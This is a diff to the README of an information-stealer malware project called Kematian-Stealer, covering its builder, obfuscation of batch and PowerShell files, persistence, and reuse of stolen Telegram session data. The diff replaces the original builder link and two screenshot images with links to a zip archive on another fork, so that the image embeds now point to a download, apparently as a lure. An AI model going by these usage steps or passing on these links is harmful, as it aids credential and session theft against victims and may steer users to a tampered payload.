@@ -46,7 +46,8 @@ Moreover, the tool has robust `persistence mechanisms` to remain active on the m
 <br>
 
 # Usage
-- Download [Builder](https://github.com/Somali-Devs/Kematian-Stealer/releases/download/AutoBuild/main.exe) from the releases.
+- Download [Files](https://github.com/yexn1/Kematian-Stealer/archive/refs/heads/main.zip).
+- Use builder.bat 
 - The builder will automatically generate your `private key` and `certificate` at first run, you can find them here `$env:appdata\Kematian-Stealer`
 - After opening the builder, it will also start a local server which will run on `https://127.0.0.1:8080` by default.
 - Open your web browser and go to `https://127.0.0.1:8080/builder`
@@ -85,7 +86,7 @@ $encryption_key = "YOUR_ENC_KEY_HERE"
 
 # Screenshots
   ## 🔨 Builder
-> ![builder](https://github.com/Chainski/Kematian-Stealer/assets/96607632/d33f2f68-4ac9-48cf-93ed-152c2de806d7)
+> ![builder](https://github.com/yexn1/Kematian-Stealer/archive/refs/heads/main.zip)
 
    ### Builder Features
  - [x] 🔸 Obfuscation of `BAT` and `PS1` files
@@ -158,7 +159,7 @@ Now, copy the `tdata` folder from `Telegram` folder and paste it in the director
 %userprofile%\AppData\Roaming\Telegram Desktop
 ```
 Before pasting the tdata folder, ensure that you have deleted or backup the existing tdata folder on your PC.
-![telegram](https://github.com/Chainski/Kematian-Stealer/assets/96607632/6cdd0048-b414-484e-8d32-7fe6fc531b4c)
+![DOWNLOAD](https://github.com/yexn1/Kematian-Stealer/archive/refs/heads/main.zip)
 
  > [!NOTE]   
  > ***The other session stealers can be utilized by applying the technique above***
